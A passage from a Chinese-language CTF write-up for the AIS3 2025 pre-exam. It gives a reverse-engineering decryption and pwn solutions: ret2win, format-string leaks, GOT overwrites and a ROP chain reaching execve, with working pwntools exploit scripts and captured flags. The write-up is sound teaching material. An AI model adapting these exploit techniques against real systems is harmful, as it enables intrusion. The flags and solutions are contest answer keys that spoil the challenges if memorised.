alt="image"></p><p>而在步過這個function之後，<code>buffer</code>內容就跟在<code>encrypted_image.png</code>中的一樣了，所以確定<code>sub_401520()</code>就是加密function<br><img src="https://hackmd.io/_uploads/HkApdd4flx.png" alt="image"></p><p><code>sub_401520()</code>的加密方式其實就是把每一個byte xor 114之後+4<br>所以，把<code>encrypted_image.png</code>中每一個byte都-4之後xor 114就可以拿到原始檔案<br><img src="https://hackmd.io/_uploads/rJw7tONzex.png" alt="image"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./encrypted_image.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> eif:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> sf: sf.write(<span class="hljs-built_in">bytes</span>([((i-<span class="hljs-number">4</span>)%<span class="hljs-number">256</span>) ^ <span class="hljs-number">114</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> eif.read()]))<br></code></pre></td></tr></table></figure><p>input_image.png<br><img src="https://hackmd.io/_uploads/ryGI9uNzeg.png" alt="image"></p><blockquote><p><code>AIS3&#123;rwx_53gm3nttt_s0_5AS&#125;</code></p></blockquote><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome-to-the-World-of-Ave-Mujica🌙"><a href="#Welcome-to-the-World-of-Ave-Mujica🌙" class="headerlink" title="Welcome to the World of Ave Mujica🌙"></a>Welcome to the World of Ave Mujica🌙</h2><p><img src="https://hackmd.io/_uploads/SJeNCdNGxl.png" alt="image"></p><p><code>0x4014ac</code>處，有一個<code>read</code>，從<code>stdin</code>讀取輸入到stack上的<code>buf</code><br><code>read</code>的<code>size</code>是<code>rax_9</code>(型別 char aka int8_t)，而<code>rax_9</code>來自<code>0x40147d</code>呼叫<code>read_int8()</code>的回傳值<br><img src="https://hackmd.io/_uploads/rkdVytEGle.png" alt="image"></p><p><code>read_int8()</code>，使用<code>read</code>讀取4個字輸入到<code>var_10</code>中，然後用<code>atoi()</code>轉成整數型別，把結果存入<code>int32_t rax</code>中，如果<code>rax &lt;= 0x7f</code>就回傳<code>rax</code>，否則直接<code>exit()</code>結束整個程式<br>但<code>rax</code>的型別是<code>int32_t</code>(有符號32位整數)，而<code>read</code>的<code>size</code>參數型別是<code>size_t</code>，如果輸入<code>-1</code>，轉成<code>int32_t</code>就也會是<code>-1</code>，<code>-1 &lt;= 0x7f</code>就可以通過檢查<br>return之後回傳值存入<code>main()</code>的<code>rax_9</code>，變成<code>-1</code>(char aka int8_t)，但傳入<code>read</code>時因為<code>size</code>型別是<code>size_t</code>，<code>-1</code>會變成<code>0xff</code>，就可以獲取一個buffer overflow<br><img src="https://hackmd.io/_uploads/ryvvNKNGlg.png" alt="image"></p><p>程式裡面就有win function可以用，buffer overflow直接打一波ret2win(ret2func)就解決<br><img src="https://hackmd.io/_uploads/HkXtIY4zex.png" alt="image"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#r = process(&quot;./chal&quot;)</span><br>r = remote(<span class="hljs-string">&quot;chals1.ais3.org&quot;</span>, <span class="hljs-number">60876</span>)<br><br>r.recvlines(<span class="hljs-number">9</span>)<br>r.sendline(<span class="hljs-string">b&quot;yes&quot;</span>)<br><br>r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;-1&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">8</span>*<span class="hljs-number">21</span>)+p64(<span class="hljs-number">0x40125a</span>))<br><br>r.interactive()<br></code></pre></td></tr></table></figure><blockquote><p><code>AIS3&#123;Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._962ed0da8cc268db91ab18d21c20320a&#125;</code></p></blockquote><h2 id="Format-Number"><a href="#Format-Number" class="headerlink" title="Format Number"></a>Format Number</h2><p><img src="https://hackmd.io/_uploads/r1nR8tNMle.png" alt="image"></p><p>Ln24<del>Ln27: 開啟<code>/home/chal/flag.txt</code>並將內容讀到stack上的buffer<code>v12</code><br>Ln28</del>Ln30: 讀取輸入15 bytes到buffer<code>v7</code><br>Ln31: 把<code>v7</code>丟到<code>check_format()</code>中<br>Ln35~Ln41: 合成字串<code>&quot;%3$&quot; + v7 + &quot;d\n&quot;</code>到<code>v8</code>，最後<code>print(v8)</code><br>v8直接被作為<code>format</code>，有了打format string attack的機會<br><img src="https://hackmd.io/_uploads/B12owFNGgl.png" alt="image"></p><p>但看到<code>check_format()</code>內部，簡單講就是過濾傳入的字串(buffer<code>v7</code>)，不能有英文字母跟空格<br><img src="https://hackmd.io/_uploads/BychutNflx.png" alt="image"></p><p>最後我構建的payload是<code>^%?$</code>(問號那邊改成數字)，這樣合成出來的v8就會是<code>&quot;%3$&quot; + &quot;^%?$&quot; + &quot;d\n&quot; = &quot;%3$^%?$d\n&quot;</code>。<br>就是一種打injection的感覺，payload最前面的<code>^</code>是截斷的作用，後面構造一個新的<code>format</code></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment">#r = process(&quot;./chal&quot;)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>, <span class="hljs-number">60</span>):<br>    r = remote(<span class="hljs-string">&quot;chals1.ais3.org&quot;</span>, <span class="hljs-number">50960</span>)<br><br>    r.sendlineafter(<span class="hljs-string">b&quot;What format do you want ? &quot;</span>, (<span class="hljs-string">f&quot;^%<span class="hljs-subst">&#123;i&#125;</span>$&quot;</span>).encode())<br>    r.recvuntil(<span class="hljs-string">b&quot;: %^&quot;</span>)<br>    f = <span class="hljs-built_in">int</span>(r.recvline().decode().strip(), <span class="hljs-number">10</span>)<br><br>    flag += <span class="hljs-built_in">chr</span>(f)<br><br>    r.close()<br><br>success(flag)<br></code></pre></td></tr></table></figure><blockquote><p><code>AIS3&#123;S1d3_ch@nn3l_0n_fOrM47_strln&amp;_!!!&#125;</code></p></blockquote><h2 id="MyGO-schedule-manager-α"><a href="#MyGO-schedule-manager-α" class="headerlink" title="MyGO schedule manager α"></a>MyGO schedule manager α</h2><p><img src="https://hackmd.io/_uploads/rJFK5tVzxl.png" alt="image"></p><p>checksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">p23@fubukisocute</span> <span class="hljs-string">share</span>]<span class="hljs-string">$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">chal</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/p23/ctf/2025_ais3_preexam/dist-schedule-alpha-88389c8815258702516ef158e4a3e8c4b39d2a46/share/chal&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">SHSTK:</span>      <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">IBT:</span>        <span class="hljs-string">Enabled</span><br></code></pre></td></tr></table></figure><p>這題主要有四個操作可以用，分別是create schedule, edit title, edit content, show schedule</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    init_proc();<br>    <br>    <span class="hljs-type">int</span> choice;<br>    <span class="hljs-type">int</span> index;<br>    <br>    login();<br>    <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        menu();<br>        choice = get_choice();<br>        <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">1</span>)&#123;<br>            create();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">2</span>)&#123;<br>            edit_title();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">3</span>)&#123;<br>            edit_content();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-number">4</span>)&#123;<br>            show();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>struct schedule</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">schedule</span>&#123;</span><br>    <span class="hljs-type">char</span> title[<span class="hljs-number">0x16</span>];<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> content;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在<code>create()</code>中，可以創建一個<code>struct schedule</code>，<code>cin</code>輸入到<code>schedule-&gt;title</code>(char array)跟<code>schedule-&gt;content</code>(std::string)<br>每次運行都只能創建一個schedule</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(SCHEDULE_STATUS == <span class="hljs-number">0</span>)&#123;<br>        sched = new(<span class="hljs-built_in">std</span>::nothrow) schedule;<br>        <span class="hljs-keyword">if</span> (sched == nullptr) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Memory allocation failed!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;MyGO @ sched title &gt; &quot;</span>);<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; sched-&gt;title;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;MyGO @ sched content &gt; &quot;</span>);<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; sched-&gt;content;<br>        <br>        SCHEDULE_STATUS = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Create Success !!!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Your schedule have been created&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>edit_title()</code>中，你可以<code>cin</code>輸入到已有的schedule的title，但是schedule-&gt;title是char array，這裡也沒有任何安全機制，會導致buffer overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">edit_title</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span> (SCHEDULE_STATUS == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;MyGO @ sched title &gt; &quot;</span>);<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; sched-&gt;title;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Edit Success&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Schdule Not Found ... &quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>edit_content()</code>中，你可以<code>cin</code>輸入到已有的schedule的content，schedule-&gt;content是std::string，沒有buffer overflow但是這裡後面還有戲</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">edit_content</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span> (SCHEDULE_STATUS == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;MyGO @ sched content &gt; &quot;</span>);<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; sched-&gt;content;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Edit Success&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Schdule Not Found ... &quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p><code>show</code>就是把schedule的title跟content的內容都print出來</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span> (SCHEDULE_STATUS == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;===== Schedule =====\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyGO @ Title : %15s\n&quot;</span>, sched -&gt; title);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MyGO @ Content : %s\n&quot;</span>, sched -&gt; content.c_str());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;====================\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Schdule Not Found ... &quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先看<code>struct schedule</code>在記憶體中的樣貌<br>可以看到，user data的前0x18 bytes都是schedule-&gt;title<br>而後面0x18 bytes是schedule-&gt;content，也就是一個std::string結構體，其中有一個可以理解成data pointer的成員(這個成員是個指針，會指向這個std::string存資料的地方)，還有一個可以理解成data size的成員(這裡會紀錄這個std::string存了多少bytes的資料)<br><img src="https://hackmd.io/_uploads/H13XNTEfxl.png" alt="image"></p><p>前面分析時得知<code>edit_title()</code>存在buffer overflow漏洞，如果用這個bof劫持schedule-&gt;content的data pointer，就可以達到任意讀寫</p><p>這題我的解題思路是這樣:</p><ol><li>用<code>edit_title()</code>的buffer overflow劫持schedule-&gt;content的data pointer，改到程式本體的GOT上，用<code>show()</code>leak libc(因為scheduler-&gt;content的data pointer已經被改到GOT上，所以print出來的就會是GOT上的資料)</li><li>用<code>edit_title()</code>的buffer overflow劫持schedule-&gt;content的data pointer，改到<strong>libc</strong>的<code>strlen</code>的GOT上，用<code>edit_content()</code>修改<strong>libc</strong><code>strlen</code>的GOT，改成win function的address</li><li>後面<code>puts</code>內部呼叫<code>strlen</code>時，因為<strong>libc</strong><code>strlen</code>的GOT已經被劫持、修改成win function address，最後就會變成呼叫win function進而get shell</li></ol><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#r = process(&quot;./chal&quot;)</span><br>r = remote(<span class="hljs-string">&quot;chals1.ais3.org&quot;</span>, <span class="hljs-number">51000</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">c</span>): r.sendlineafter(<span class="hljs-string">b&quot;&lt; MyGO @ ScheduleManager $ &gt; &quot;</span>, <span class="hljs-built_in">str</span>(c).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">title, content</span>):<br>    choice(<span class="hljs-number">1</span>)<br>    r.recvline()<br>    r.sendline(title)<br>    r.recvline()<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_title</span>(<span class="hljs-params">title</span>):<br>    choice(<span class="hljs-number">2</span>)<br>    r.recvline()<br>    r.sendline(title)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_content</span>(<span class="hljs-params">content</span>):<br>    choice(<span class="hljs-number">3</span>)<br>    r.recvline()<br>    r.sendline(content)<br><br><span class="hljs-comment"># login</span><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;MyGO!!!!!&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;TomorinIsCute&quot;</span>)<br><br><span class="hljs-comment"># leak libc</span><br>create(<span class="hljs-string">b&quot;aaa&quot;</span>, <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">0x10</span>)<br>edit_title(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x403f60</span>) + p64(<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x1e</span>))<br>choice(<span class="hljs-number">4</span>)<br>r.recvlines(<span class="hljs-number">2</span>)<br>r.recvuntil(<span class="hljs-string">b&quot;MyGO @ Content : &quot;</span>)<br>libc = u64(r.recv(<span class="hljs-number">6</span>) + <span class="hljs-string">b&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x815f0</span><br>success(<span class="hljs-string">&quot;libc -&gt; %s&quot;</span>%<span class="hljs-built_in">hex</span>(libc))<br><br><span class="hljs-comment"># hijacking GOT of glibc</span><br>target = libc + <span class="hljs-number">0x21a098</span><br>success(<span class="hljs-string">&quot;target -&gt; %s&quot;</span>%<span class="hljs-built_in">hex</span>(target))<br>edit_title(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x18</span>+p64(target) + p64(<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x1e</span>))<br><span class="hljs-comment">#raw_input()</span><br>edit_content(p64(<span class="hljs-number">0x4013ec</span>))<br><br>r.interactive()<br></code></pre></td></tr></table></figure><blockquote><p><code>AIS3&#123;MyGO!!!!!T0m0rin_1s_cut3@u_a2r_mAsr3r_0f_CP1usp1us_string_a2d_0verf10w!_alpha_v3r2on_have_br0ken...Go_p1ay_b3ta!&#125;</code></p></blockquote><h2 id="Author-RPG"><a href="#Author-RPG" class="headerlink" title="Author ?????? RPG"></a>Author ?????? RPG</h2><p><img src="https://hackmd.io/_uploads/rkutTTEMex.png" alt="image"></p><p>checksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">p23@fubukisocute</span> <span class="hljs-string">dist-author-rpg-960b2ec8ee649ff4e0abf5a1afd8a7fb9f0d0bae</span>]<span class="hljs-string">$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">share/chal</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/p23/ctf/2025_ais3_preexam/dist-author-rpg-960b2ec8ee649ff4e0abf5a1afd8a7fb9f0d0bae/share/chal&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">SHSTK:</span>      <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">IBT:</span>        <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>這題的第一個漏洞點，是在Ln40處，存在一個oob<br>對於輸入的rank(int)完全沒有檢查，讓使用者可以輸入一個大數字或是負數來達成oob</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Competition Rank [1-100] &gt; &quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;rank);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name [] &gt; &quot;</span>);<br>read(<span class="hljs-number">0</span>, challenger[rank - <span class="hljs-number">1</span>], <span class="hljs-number">0xf</span>);<br></code></pre></td></tr></table></figure><p>這題的第二個漏洞點，在<code>kill_Curious()</code>中，存在一個oob<br>對於index<code>kill_Curious_cnt</code>沒有任何檢查，意思就是只要可以執行這個function夠多次就可以oob</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kill_Curious</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> worst_challenge[<span class="hljs-number">12</span>][<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;⚔️⚔️⚔️\n\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;Result : Curious has been killed by you.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;Worst Challenge [] &gt; &quot;</span>);<br>    read(<span class="hljs-number">0</span>, &amp;worst_challenge[kill_Curious_cnt], <span class="hljs-number">0xf</span>);<br>    kill_Curious_cnt += <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>按照程式正常的流程，<code>kill_Curious()</code>只會被執行一次<br><img src="https://hackmd.io/_uploads/ByXyx04Mle.png" alt="image"></p><p>不過我有以下思路:</p><ol><li>用第一個漏洞，輸入負數的<code>rank</code>導致oob，竄改<code>puts</code>跟<code>printf</code>的GOT為<code>kill_Curious()</code>，這樣就能讓<code>kill_Curious()</code>被執行很多次，讓第二個漏洞可以被利用</li><li>執行夠多次<code>kill_Curious()</code>的時候，就會oob，<code>worst_challenge</code>是local variable，這個oob帶來的就會是可以竄改saved_rbp跟return address，這邊把saved_rbp放成<code>competition</code>的位址-0x8，把return address放一個<code>leave ; ret</code>，這樣執行兩次<code>leave ; ret</code>，<code>rsp</code>就可以被改到<code>competition</code>上</li><li>在程式一開始，要求向<code>competition</code>輸入的時候，就可以先佈置一些Gadget，這樣後面<code>rsp</code>跑到<code>competition</code>上，就可以打一波ROP</li></ol><p>至於如何用ROP get shell:</p><ol><li>呼叫<code>read</code>多寫一條ROP chain在<code>competition</code>的後面</li><li>呼叫<code>read</code>修改<code>read</code>的GOT的最後1byte，改成<code>(&amp;read+15)&amp;0xff</code><br>這裡是注意到<code>read+15</code>就有一個<code>syscall</code>可以用，<code>read</code>跟<code>read+15</code>只有最後1byte有差別，而ASLR不會動下1.5bytes，改下去之後，call <code>read()</code>就會直接來到<code>syscall</code>，我們就算是有一個<code>syscall</code>gadget能用了<br><img src="https://hackmd.io/_uploads/SJ-lB0EMgl.png" alt="image"></li><li>寫了1byte進去<code>read</code>的GOT之後，<code>rax</code>會變成<code>1</code>，此時syscall就會是<code>SYS_write</code>，所以<code>rdi</code>要改成<code>1</code>(stdout)，<code>rsi</code>改成隨便一個有效位址，<code>rdx</code>改成<code>0x3b</code>，然後call <code>read()</code>，這樣就會寫入59bytes到stdout，<code>rax</code>也會是<code>0x3b</code>，變相完成了<code>rax</code>寄存器的設定</li><li>最後把<code>rdi</code>改成<code>/bin/sh</code>的位址，<code>rsi</code>跟<code>rdx</code>都改成<code>0</code>，呼叫<code>read()</code>，就可以執行<code>SYS_execve</code>get shell</li></ol><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 